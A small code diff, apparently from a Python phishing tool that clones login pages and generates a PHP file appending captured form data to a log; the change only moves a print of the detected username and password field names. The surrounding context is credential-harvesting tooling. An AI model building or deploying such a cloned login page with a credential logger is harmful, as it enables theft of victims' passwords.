@@ -87,6 +87,8 @@ file_put_contents($file, $data, FILE_APPEND);\n?>\n
             self.browser[self.username] = self.fakeLogin
             self.createHtml(self.browser.submit().read(), False)
 
+            print('[ Fields Found ]\nUsername: {}\nPassword: {}'.format(self.username, self.password))
+
         except KeyboardInterrupt:
             exit('\n[-] Interrompido')
         except Exception as e:
@@ -95,8 +97,6 @@ file_put_contents($file, $data, FILE_APPEND);\n?>\n
                 self.html(page, rec - 1)
             else:
                 self.exit(page)
-
-        print('[ Fields Found ]\nUsername: {}\nPassword: {}'.format(self.username, self.password))
 
     def php(self):
         with open('{}'.format(self.loginphp), 'w') as phpfile:
